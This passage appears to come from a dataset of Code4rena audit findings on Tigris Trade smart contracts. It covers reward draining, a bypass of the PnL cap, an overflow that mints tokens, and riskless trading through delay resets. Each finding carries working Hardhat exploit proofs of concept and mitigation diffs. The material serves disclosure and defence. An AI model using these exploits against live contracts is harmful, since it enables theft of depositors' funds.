lock.connect(hacker).claim(2);\n+        // pending3 keeps increasing\n+        pending3 = await bond.pending(3);\n+      }\n+      console.log(`claim count: ${i}\\nremain: ${ethers.utils.formatEther(remainReward)}\\npending3: ${ethers.utils.formatEther(pending3)}\\n`);\n+\n+      // send diff, then drain rewards in bond\n+      await stabletoken.connect(hacker).transfer(bond.address, pending3.sub(remainReward));\n+      await lock.connect(hacker).claim(3);\n+      st = await getState();\n+      // !! bond is drained !!\n+      expect(st.bond).to.be.eq(0);\n+      // !! hacker gets all rewards !!\n+      expect(st.hacker).to.be.eq(TotalRewards.add(parseEther(700)));\n+      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));\n+      expect(st.pending2).to.be.eq(0);\n+      expect(st.pending3).to.be.eq(0);\n+    });\n   });\n+\n   describe(\"Withdrawing\", function () {\n     it(\"Only expired bonds can be withdrawn\", async function () {\n       await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"100\"));\n```\n\nOutput:\n\n```\n  Bonds\n    Rewards\nclaim count: 41\nremain: 7900.000000000000000002\npending3: 8055.7342616570405578\n\n       Drain BondNFT rewards\n\n  1 passing (4s)\n\n```\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nI recommend that an expired bond should be forced to `release()`, `claim()` an expired bond should revert.\n\nSample code:\n\n```solidity\n\ndiff --git a/contracts/BondNFT.sol b/contracts/BondNFT.sol\nindex 33a6e76..77e85ae 100644\n--- a/contracts/BondNFT.sol\n+++ b/contracts/BondNFT.sol\n@@ -148,7 +148,7 @@ contract BondNFT is ERC721Enumerable, Ownable {\n         amount = bond.amount;\n         unchecked {\n             totalShares[bond.asset] -= bond.shares;\n-            (uint256 _claimAmount,) = claim(_id, bond.owner);\n+            (uint256 _claimAmount,) = _claim(_id, bond.owner);\n             amount += _claimAmount;\n         }\n         asset = bond.asset;\n@@ -157,8 +157,9 @@ contract BondNFT is ERC721Enumerable, Ownable {\n         _burn(_id);\n         emit Release(asset, lockAmount, _owner, _id);\n     }\n+\n     /**\n-     * @notice Claim rewards from a bond\n+     * @notice Claim rewards from an unexpired bond\n      * @dev Should only be called by a manager contract\n      * @param _id ID of the bond to claim rewards from\n      * @param _claimer address claiming rewards\n@@ -168,6 +169,22 @@ contract BondNFT is ERC721Enumerable, Ownable {\n     function claim(\n         uint _id,\n         address _claimer\n+    ) public onlyManager() returns(uint amount, address tigAsset) {\n+        Bond memory bond = idToBond(_id);\n+        require(!bond.expired, \"expired\");\n+        return _claim(_id, _claimer);\n+    }\n+\n+    /**\n+     * @notice Claim rewards from a releasing bond or an unexpired bond\n+     * @param _id ID of the bond to claim rewards from\n+     * @param _claimer address claiming rewards\n+     * @return amount amount of tigAsset claimed\n+     * @return tigAsset tigAsset token address\n+     */\n+    function _claim(\n+        uint _id,\n+        address _claimer\n     ) public onlyManager() returns(uint amount, address tigAsset) {\n         Bond memory bond = idToBond(_id);\n         require(_claimer == bond.owner, \"!owner\");\n```\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/170)**\n \n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/170#issuecomment-1383192458):**\n > The warden has shown how, due to an inconsistent implementation of Bond State change, how they could repeatedly claim rewards for an expired bond, stealing value from all other depositors.\n> \n> Because the findings doesn't just deny yield to others, but allows a single attacker to seize the majority of the yield rewards, leveraging a broken invariant, I agree with High Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/170#issuecomment-1407494699):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174442 \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the BondNFT contract code that allows a malicious user to drain all assets from the contract. The vulnerability lies in the fact that when calling the BondNFT.claim() method for an expired bond, it will recalculate the accRewardsPerShare, which can be exploited by a malicious user to steal all of the assets in the contract. \n\nThe malicious user can exploit this vulnerability by first creating two bonds (B1 and B2) with different expireEpochs, and then repeatedly calling the Lock.claim(B1) method to increase the rewards of B2 until the pending rewards of B2 approaches the total amount of assets in the contract. The malicious user can then call the Lock.claim(B2) method to claim all of the pending rewards of B2 and drain all of the assets in the BondNFT contract.\n\nThe recommended mitigation steps for this vulnerability are to force an expired bond to release, and to make the claim() method for an expired bond revert. This can be achieved by adding the following code to the BondNFT.sol contract: \n\n```solidity\ndiff --git a/contracts/BondNFT.sol b/contracts/BondNFT.sol\nindex 33a6e76..77e85ae 100644\n--- a/contracts/BondNFT.sol\n+++ b/contracts/BondNFT.sol\n@@ -148,7 +148,7 @@ contract BondNFT is ERC721Enumerable, Ownable {\n         amount = bond.amount;\n         unchecked {\n             totalShares[bond.asset] -= bond.shares;\n-            (uint256 _claimAmount,) = claim(_id, bond.owner);\n+            (uint256 _claimAmount,) = _claim(_id, bond.owner);\n             amount += _claimAmount;\n         }\n         asset = bond.asset;\n@@ -157,8 +157,9 @@ contract BondNFT is ERC721Enumerable, Ownable {\n         _burn(_id);\n         emit Release(asset, lockAmount, _owner, _id);\n     }\n+\n     /**\n-     * @notice Claim rewards from a bond\n+     * @notice Claim rewards from an unex",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/170",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "__141345__",
        "hihen",
        "hansfriese",
        "unforgiven",
        "rvierdiiev"
      ]
    },
    {
      "id": "6323",
      "title": "[H-04] Bypass the maximum PnL check to take extra profit",
      "impact": "HIGH",
      "content": "\nTo protect the fund of vault, the protocol has a security mechanism which limits:\n\n    Maximum PnL is +500%. \n\nsource: <https://docs.tigris.trade/protocol/trading-and-fees#limitations>\n\nBut the implementation is missing to check this limitation while `addToPosition()`, an attacker can exploit it to get more profit than expected.\n\n### Proof of Concept\n\nThe following test case shows both normal case and the exploit scenario.\n\nIn the normal case,  a 990 USD margin, gets back a 500% of 4950 USD payout, and the profit is 3960 USD.\n\nIn the exploit case, the attack will get an extra 2600+ USD profit than the normal case.\n\n```\nconst { expect } = require(\"chai\");\nconst { deployments, ethers, waffle } = require(\"hardhat\");\nconst { parseEther, formatEther } = ethers.utils;\nconst { signERC2612Permit } = require('eth-permit');\nconst exp = require(\"constants\");\n\ndescribe(\"Design Specification: Maximum PnL is +500%\", function () {\n\n  let owner;\n  let node;\n  let user;\n  let node2;\n  let node3;\n  let proxy;\n\n  let Trading;\n  let trading;\n\n  let TradingExtension;\n  let tradingExtension;\n\n  let TradingLibrary;\n  let tradinglibrary;\n\n  let StableToken;\n  let stabletoken;\n\n  let StableVault;\n  let stablevault;\n\n  let position;\n\n  let pairscontract;\n  let referrals;\n\n  let permitSig;\n  let permitSigUsdc;\n\n  let MockDAI;\n  let mockdai;\n  let MockUSDC;\n  let mockusdc;\n\n  let badstablevault;\n\n  let chainlink;\n\n  beforeEach(async function () {\n    await deployments.fixture(['test']);\n    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();\n    StableToken = await deployments.get(\"StableToken\");\n    stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);\n    Trading = await deployments.get(\"Trading\");\n    trading = await ethers.getContractAt(\"Trading\", Trading.address);\n    await trading.connect(owner).setMaxWinPercent(5e10);\n    TradingExtension = await deployments.get(\"TradingExtension\");\n    tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);\n    const Position = await deployments.get(\"Position\");\n    position = await ethers.getContractAt(\"Position\", Position.address);\n    MockDAI = await deployments.get(\"MockDAI\");\n    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n    MockUSDC = await deployments.get(\"MockUSDC\");\n    mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n    const PairsContract = await deployments.get(\"PairsContract\");\n    pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);\n    const Referrals = await deployments.get(\"Referrals\");\n    referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);\n    StableVault = await deployments.get(\"StableVault\");\n    stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);\n    await stablevault.connect(owner).listToken(MockDAI.address);\n    await stablevault.connect(owner).listToken(MockUSDC.address);\n    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\n    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));\n    await tradingExtension.connect(owner).setNode(node.address, true);\n    await tradingExtension.connect(owner).setNode(node2.address, true);\n    await tradingExtension.connect(owner).setNode(node3.address, true);\n    await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000000]);\n    await network.provider.send(\"evm_mine\");\n    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n\n    const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");\n    badstablevault = await BadStableVault.deploy(StableToken.address);\n\n    const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");\n    chainlink = await ChainlinkContract.deploy();\n\n    TradingLibrary = await deployments.get(\"TradingLibrary\");\n    tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n    await trading.connect(owner).setLimitOrderPriceRange(1e10);\n  });\n\n\n  describe(\"Bypass the maximum PnL check to take extra profit\", function () {\n    let orderId;\n    let closePriceData;\n    let closeSig;\n    let initPrice = parseEther(\"1000\");\n    let closePrice = parseEther(\"2000\");\n    beforeEach(async function () {\n      let maxWin = await trading.maxWinPercent();\n      expect(maxWin.eq(5e10)).to.equal(true);\n\n      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, initPrice, 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n      orderId = await position.getCount();\n      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n      expect(await position.assetOpenPositionsLength(1)).to.equal(1);\n      let trade = await position.trades(orderId);\n      let marginAfterFee = trade.margin;\n      expect(marginAfterFee.eq(parseEther('990'))).to.equal(true);\n\n      // Some time later\n      await network.provider.send(\"evm_setNextBlockTimestamp\", [2000001000]);\n      await network.provider.send(\"evm_mine\");\n      \n      // Now the price is doubled, profit = margin * leverage = $990 * 10 = $9900\n      closePriceData = [node.address, 1, closePrice, 0, 2000001000, false];\n      let closeMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, closePrice, 0, 2000001000, false]\n        )\n      );\n      closeSig = await node.signMessage(\n        Buffer.from(closeMessage.substring(2), 'hex')\n      );\n\n    });\n\n    it.only(\"All profit is $9900, close the order normally, only get $3960 profit\", async function () {\n      let balanceBefore = await stabletoken.balanceOf(owner.address);\n      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n      let balanceAfter = await stabletoken.balanceOf(owner.address);\n      let marginAfterFee = parseEther(\"990\");\n      let payout = balanceAfter.sub(balanceBefore);\n      expect(payout.eq(parseEther(\"4950\"))).to.be.true;\n\n      let profit = balanceAfter.sub(balanceBefore).sub(marginAfterFee);\n      expect(profit.eq(parseEther(\"3960\"))).to.be.true;\n\n    });\n\n    it.only(\"All profit is $9900, bypass the PnL check to take extra $2600 profit\", async function () {\n      // We increase the possition first rather than closing the profit order directly\n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      let extraMargin = parseEther(\"1000\");\n      await trading.connect(owner).addToPosition(orderId, extraMargin, closePriceData, closeSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      // 60 secs later\n      await network.provider.send(\"evm_setNextBlockTimestamp\", [2000001060]);\n      await network.provider.send(\"evm_mine\");\n  \n      // Now we close the order to take all profit\n      closePriceData = [node.address, 1, closePrice, 0, 2000001060, false];\n      let closeMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, closePrice, 0, 2000001060, false]\n        )\n      );\n      closeSig = await node.signMessage(\n        Buffer.from(closeMessage.substring(2), 'hex')\n      );\n\n      let balanceBefore = await stabletoken.balanceOf(owner.address);\n      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n      let balanceAfter = await stabletoken.balanceOf(owner.address);\n      let marginAfterFee = parseEther(\"990\").add(extraMargin.mul(990).div(1000));\n      let originalProfit = parseEther(\"3960\");\n      let extraProfit = balanceAfter.sub(balanceBefore).sub(marginAfterFee).sub(originalProfit);\n      expect(extraProfit.gt(parseEther('2600'))).to.be.true;\n    });\n\n  });\n});\n\n\n```\n\nThe test result\n\n     Design Specification: Maximum PnL is +500%\n        Bypass the maximum PnL check to take extra profit\n           All profit is $9900, close the order normally, only get $3960 profit\n           All profit is $9900, bypass the PnL check to take extra $2600 profit\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nAdd a check for `addToPosition()` function, revert if PnL >= 500%, enforce users to close the order to take a limited profit.\n\n**[TriHaz (Tigris Trade) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1364943872):**\n > It is valid but I think it should be Medium risk as it needs +500% win to happen so assets are not in a direct risk, need a judge opinion on this.\n\n**[KingNFT (warden) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1378270756):**\n > As the max leverages are 100x for crypto pairs and 500x for forex pairs, so 5% price change on crypto pairs or 1% on forex pairs lead to 500% profit. I think it would be frequent to see +500% win happening.\n> \n> In my personal opinion, the ````500%```` security design is a base and important feature to protect fund safety of stakers, this bug causes the feature almost not working. Maybe it deserves a high severity.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1383720303):**\n > The Warden has shown how, because of a lack of checks, an attacker could bypass the PNL cap and extract more value than intended.\n> \n> While the condition of having a price movement of 500% can be viewed as external, I believe that in this specific case we have to exercise more nuance.\n> \n> An attacker could setup a contract to perform the sidestep only when favourable, meaning that while the condition may not always be met, due to volatility of pricing there always is a % (can be viewed as a poisson distribution) that a PNL bypass would favour the attacker.\n> \n> Additionally, after the [CRV / AVI attack](https://chaindebrief.com/how-manipulation-on-aave-and-curve-went-wrong-attacker-got-rekted-instead/) we have pretty strong evidence that any +EV scenario can be exploited as long as the payout is high enough.\n> \n> As such I believe that the finding doesn't truly rely on an external condition.\n> \n> For this reason, as well as knowing that the value extracted will be paid by LPs / the Protocol, I believe High Severity to be the most appropriate\n\n**[GainsGoblin (Tigris Trade) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1407134511):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173887 \n >\n> Implemented something similar to this report's recommended mitigation, where if PnL is >= maxPnl%-100%, then addToPosition, addMargin and removeMargin revert.\n\n\n\n***\n\n",
      "summary": "\nThis bug report deals with a vulnerability in the code of the Tigris Protocol, which is a decentralized trading protocol. The vulnerability relates to the security mechanism that is supposed to limit the maximum PnL to 500%. In the proof of concept, it is demonstrated that an attacker can exploit this vulnerability to get more profit than expected.\n\nThe tools used in the bug report were VS Code. The recommended mitigation step is to add a check for the addToPosition() function, which should revert if the PnL is greater than or equal to 500%. This would enforce users to close the order to take a limited profit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/111",
      "tags": [],
      "finders": [
        "KingNFT"
      ]
    },
    {
      "id": "6322",
      "title": "[H-03] Certain fee configuration enables vaults to be drained",
      "impact": "HIGH",
      "content": "\nAn overflow in `TradingLibrary.pnl()` enables all funds from the vault contracts to be drained given a certain fee configuration is present.\n\n### Detailed exploit process description\n\nWhen opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in an `unchecked` block. Setting this value specifically to attack the vault leads to the `Trading` contract minting a huge (in the example below `10^36`) Tigris tokens, which can then be given to the vault to withdraw assets.\n\nThe exploiter starts by setting himself as referrer, in order to later receive the referrer fees.\n\nThe next step is to open a short position at the current market price by calling `initiateLimitOrder()`. Here, the malicious value which will later bring the arithmetic to overflow is passed in as take-profit price. For the example below, the value has been calculated by hand to be `115792089237316195423570985008687907854269984665640564039467` for this specific market price, leverage and margin.\n\nThe order is then immediately executed through `executeLimitOrder()`.\n\nThe final step is to close the order through `limitClose()`, which will then mint over `10^36` Tigris tokens to the attacker.\n\n### Detailed bug description\n\nThe bug takes place in `TradingLibrary.pnl()`, line 46. The function is called during the process of closing the order to calculate the payout and position size. The malicious take-profit is passed as `_currentPrice` and the order's original opening price is passed as `_price`. The take-profit has been specifically calculated so that `1e18 * _currentPrice / _price - 1e18` results in `0`, meaning `_payout = _margin` (`accInterest` is negligible for this PoC).\nLine 48 then calculates the position size. Margin and leverage have been chosen so that `_initPositionSize * _currentPrice` does not overflow, resulting in a huge `_positionSize` which is returned from the function.\n\nLater, `Trading._handleCloseFees()` is called, under the condition that `_payout > 0`, which is why the overflow had to be calculated so precisely, as to not subtract from the `_payout` but still create a large `_positionSize`. `_positionSize` is passed in to this function, and it is used to calculate DAO and referral fees. Line 805 is what requires the specific fee configuration to be present, as otherwise this line would revert. The fees have to be `daoFees = 2*referralFees` -- not exactly, but close to this relationship. Then line 792 will set the DAO fees close to zero, while the huge `referralFees` are directly minted and not included in the calculation in line 805.\n\n### Recommended Mitigation Steps\n\nThe core issue is that the arithmetic in `TradingLibrary.pnl()` overflows. I recommend removing the `unchecked` block.\n\n### Proof of Concept\n\nInsert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`:\n\n```javascript\ndescribe(\"PoC\", function () {\n    it.only(\"PoC\", async function () {\n      // Setup token balances and approvals\n      const mockDAI = await ethers.getContractAt(\"MockERC20\", MockDAI.address)\n      await mockDAI.connect(owner).transfer(user.address, parseEther(\"10000\"))\n      await mockDAI.connect(user).approve(trading.address, parseEther(\"10000\"))\n      const permitData = [\n        \"0\",\n        \"0\",\n        \"0\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        false\n      ]\n\n      // Create referral code\n      await referrals.connect(user).createReferralCode(ethers.constants.HashZero)\n\n      // Set the fees\n      await trading.connect(owner).setFees(\n        false,        // close\n        \"200000000\",  // dao  \n        \"0\",          // burn\n        \"100000000\",  // referral\n        \"0\",          // bot\n        \"0\",          // percent\n      )\n\n\n      // ============================================================== //\n      // =================== Create the limit order =================== //\n      // ============================================================== //\n      const tradeInfo = [\n        parseEther(\"1\"),          // margin amount\n        MockDAI.address,          // margin asset\n        StableVault.address,      // stable vault\n        parseEther(\"2\"),          // leverage\n        0,                        // asset id\n        false,                    // direction (short)\n        \"115792089237316195423570985008687907854269984665640564039467\",          // take profit price\n        parseEther(\"0\"),       // stop loss price\n        ethers.constants.HashZero // referral (ourself)\n      ];\n\n      // Create the order\n      await trading.connect(user).initiateLimitOrder(\n        tradeInfo,            // trade info\n        1,                    // order type (limit)\n        parseEther(\"1000\"),   // price\n        permitData,           // permit\n        user.address          // trader\n      )\n\n\n      // ============================================================== //\n      // =================== Execute the limit order ================== //\n      // ============================================================== //\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", [10])\n      await network.provider.send(\"evm_mine\")\n\n      // Create the price data\n      let priceData = [\n        node.address,                                   // provider\n        0,                                              // asset id\n        parseEther(\"1000\"),                             // price\n        10000000,                                       // spread (0.1%)\n        (await ethers.provider.getBlock()).timestamp,   // timestamp\n        false                                           // is closed\n      ]\n\n      // Sign the price data\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      )\n\n      // Execute the limit order\n      await trading.connect(user).executeLimitOrder(1, priceData, sig);\n\n\n\n\n\n      // ============================================================== //\n      // ======================== Close order  ======================== //\n      // ============================================================== //\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", [10])\n      await network.provider.send(\"evm_mine\")\n\n      // Close order\n      await trading.connect(user).limitClose(\n        1,          // id\n        true,       // take profit\n        priceData,  // price data\n        sig,        // signature\n      )\n\n      // Print results\n      const amount = await stabletoken.balanceOf(user.address)\n      const tenPow18 = \"1000000000000000000\"\n      console.log(`StableToken balance at end: ${(amount / tenPow18).toString()}`)\n    })\n})\n```\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/86)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/86#issuecomment-1399443161):**\n > In contrast to other reports that have some ambiguity, this report has shown a way to undercollateralize the vault and steal effectively all value.\n>\n > The Warden has shown how, by leveraging `unchecked` math and using injected-inputs, it's possible to effectively mint an infinite amount of Stable Tokens.\n> \n> Mitigation will require ensuring that user provided inputs do not allow for overflows.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/86#issuecomment-1407133086):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173668\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `TradingLibrary.pnl()` function which enables all funds from the vault contracts to be drained given a certain fee configuration is present. When opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in an `unchecked` block. If a malicious value is passed in, the arithmetic in the function can overflow and result in a huge `_positionSize` which is returned from the function. This can then be used to calculate DAO and referral fees and mint huge referral fees.\n\nThe recommended mitigation for this bug is to remove the `unchecked` block from the `TradingLibrary.pnl()` function. A proof-of-concept code is also included in the report.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/86",
      "tags": [],
      "finders": [
        "Bobface"
      ]
    },
    {
      "id": "6321",
      "title": "[H-02] Riskless trades due to delay check",
      "impact": "HIGH",
      "content": "\n`Trading.limitClose()` uses `_checkDelay()`. This allows for riskless trades, by capturing price rises through increasing the stop-loss, while preventing the underwater position to be closed in case of the price dropping by continuously increasing the delay.\n\n### Detailed description\n\nA malicious trader can exploit the `Trading` contract to achieve riskless trades. In the worst-case scenario, the trader can always close the trade break-even, while in a good scenario the trader captures all upside price movement.\n\nThe exploit is based on three principles:\n\n1.  The stop-loss of a position can be updated without any delay checks, due to `_checkDelay()` not being called in `updateTpSl()`\n2.  Positions can only be closed by MEV bots or other third parties after the block delay has been passed due to `limitClose` calling `_checkDelay()`\n3.  The block delay can be continuously renewed for a negligible cost\n\n**Based on these three principles, the following method can be used to perform riskless trades:**\nAssuming a current market price of 1,000 DAI, begin by opening a long limit order through `initiateLimitOrder()` at the current market price of 1,000 DAI and stop-loss at the exact market price of 1,000 DAI. Then immediately execute the limit order through `executeLimitOrder`.\n\nAfter the block delay has passed, MEV bots or other third parties interested in receiving a percentage reward for closing the order would call `limitClose`. However, we can prevent them from doing so by continuously calling `addToPosition` with 1 wei when the block delay comes close to running out *\\[1]*, which will renew the delay and thus stops `limitClose` from being called.\n\nWhile the trader keeps renewing the delay to stop his position from being closed, he watches the price development:\n\n*   If the price goes **down**, the trader will not make any loss, since he still has his original stop-loss set. He just has to make sure that the price does not drop too far to be liquidated through `liquidatePosition()`. If the price comes close to the liquidation zone, he stops renewing the delay and closes the position break-even for the initial stop-loss price even though the price is down significantly further. He can also choose to do that at any other point in time if he decides the price is unlikely to move upward again.\n*   If the price goes **up**, the trader calls `updateTpSl()` to lock in the increased price. For example, if the price moves from 1,000 DAI to 2,000 DAI, he calls `updateTpSl()` with 2,000 DAI as stop-loss. Even if the price drops below 2,000 DAI again, the stop-loss is stored. This function can be called while the delay is still in place because there is no call to `_checkDelay()`.\n\nThe trader keeps calling `updateTpSl()` when the price reaches a new high since he opened the position initially to capture all upside movement. When he decides that the price has moved high enough, he finally lets the delay run out and calls `limitClose()` to close the order at the peak stop-loss.\n\n*Notes*\n*\\[1]*: Tigris Trade also plans to use L2s such as Arbitrum where there is one block per transaction. This could bring up the false impression that the trader would have to make lots of calls to `addToPosition` after every few transactions on the chain. However, `block.number`, which is used by the contract, actually returns the L1 block number and not the L2 block number.\n\n### Recommended Mitigation Steps\n\nThe core issue is that the position cannot be closed even if it is below the stop-loss due to constantly renewing the delay. The delay checking in `limitClose()` should be modified to also consider whether the position is below the stop-loss.\n\n### Proof of Concept\n\nInsert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`:\n\n```javascript\ndescribe(\"PoC\", function () {\n    it.only(\"PoC\", async function () {\n      // Setup token balances and approvals\n      const mockDAI = await ethers.getContractAt(\"MockERC20\", MockDAI.address)\n      await mockDAI.connect(owner).transfer(user.address, parseEther(\"10000\"))\n      await mockDAI.connect(owner).transfer(stablevault.address, parseEther(\"100000\"))\n      await mockDAI.connect(user).approve(trading.address, parseEther(\"10000\"))\n      const daiAtBeginning = await mockDAI.balanceOf(user.address)\n      const permitData = [\n        \"0\",\n        \"0\",\n        \"0\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        false\n      ]\n\n      // Setup block delay to 5 blocks\n      const blockDelay = 5;\n      await trading.connect(owner).setBlockDelay(blockDelay)\n\n\n\n\n      // ============================================================== //\n      // =================== Create the limit order =================== //\n      // ============================================================== //\n      const tradeInfo = [\n        parseEther(\"9000\"),       // margin amount\n        MockDAI.address,          // margin asset\n        StableVault.address,      // stable vault\n        parseEther(\"2\"),          // leverage\n        0,                        // asset id\n        true,                     // direction (long)\n        parseEther(\"0\"),          // take profit price\n        parseEther(\"1000\"),       // stop loss price\n        ethers.constants.HashZero // referral\n      ];\n\n      // Create the order\n      await trading.connect(user).initiateLimitOrder(\n        tradeInfo,            // trade info\n        1,                    // order type (limit)\n        parseEther(\"1000\"),   // price\n        permitData,           // permit\n        user.address          // trader\n      )\n\n\n\n      // ============================================================== //\n      // =================== Execute the limit order ================== //\n      // ============================================================== //\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", [10])\n      for (let n = 0; n < blockDelay; n++) {\n        await network.provider.send(\"evm_mine\")\n      }\n\n      // Create the price data (the price hasn't changed)\n      let priceData = [\n        node.address,                                   // provider\n        0,                                              // asset id\n        parseEther(\"1000\"),                             // price\n        10000000,                                       // spread (0.1%)\n        (await ethers.provider.getBlock()).timestamp,   // timestamp\n        false                                           // is closed\n      ]\n\n      // Sign the price data\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      )\n\n      // Execute the limit order\n      await trading.connect(user).executeLimitOrder(1, priceData, sig);\n\n\n\n\n\n\n      // ============================================================== //\n      // ================== Block bots from closing =================== //\n      // ============================================================== //\n\n      for (let i = 0; i < 5; i++) {\n\n        /*\n          This loop demonstrates blocking bots from closing the position even if the price falls below the stop loss.\n          We constantly add 1 wei to the position when the delay is close to running out.\n          This won't change anything about our position, but it will reset the delay timer,\n          stopping bots from calling `limitClose()`. \n\n          This means that if the price drops, we can keep our position open with the higher stop loss, avoiding any losses.\n          And if the price rises, we can push the stop loss higher to keep profits.\n\n          The loop runs five times just to demonstrate. In reality, this could be done as long as needed.\n        */\n\n\n        // Blocks advanced to one block before the delay would pass\n        await network.provider.send(\"evm_increaseTime\", [10])\n        for (let n = 0; n < blockDelay - 1; n++) {\n          await network.provider.send(\"evm_mine\")\n        }\n\n\n\n\n        // ============================================================== //\n        // =========== Add 1 wei to position (price is down)  =========== //\n        // ============================================================== //\n\n        // Increase delay by calling addToPosition with 1 wei\n        // Create the price data\n        priceData = [\n          node.address,                                   // provider\n          0,                                              // asset id\n          parseEther(\"900\"),                              // price\n          10000000,                                       // spread (0.1%)\n          (await ethers.provider.getBlock()).timestamp,   // timestamp\n          false                                           // is closed\n        ]\n\n        // Sign the price data - \n        message = ethers.utils.keccak256(\n          ethers.utils.defaultAbiCoder.encode(\n            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n            [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], 